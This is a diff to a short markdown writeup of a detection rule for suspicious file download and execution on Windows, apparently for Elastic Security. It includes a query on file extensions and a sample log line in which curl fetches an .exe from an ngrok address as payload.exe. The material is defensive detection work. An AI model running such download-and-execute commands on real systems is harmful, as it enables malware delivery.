@@ -1,6 +1,7 @@
 # Suspicious File Download & Execution
 
 ##  Scenario Description
+
   An attacker or malicious script downloads a file from the internet (often via PowerShell, curl, or certutil) and then executes it on a Windows host. This technique is widely used in malware delivery, phishing payloads, and initial access operations.
 
 **Common tools/methods:**
@@ -27,3 +28,7 @@ file.extension: ("exe" or "dll" or "ps1" or "bat" or "vbs" or "zip")
 "May 31, 2025 @ 14:11:25.639","curl  https://8f23-2401-4900-4deb-7fc2-3703-39b4-73d6-579b.ngrok-free.app/NORTHERN_POSSIBILITY.exe -o payload.exe","curl.exe","-"
 ```
 ## Detection Status
+
+-  Tested in Elastic Security 8.x
+-  Triggered with real-world download & run simulation
+-  Needs tuning for false positives in enterprise environment
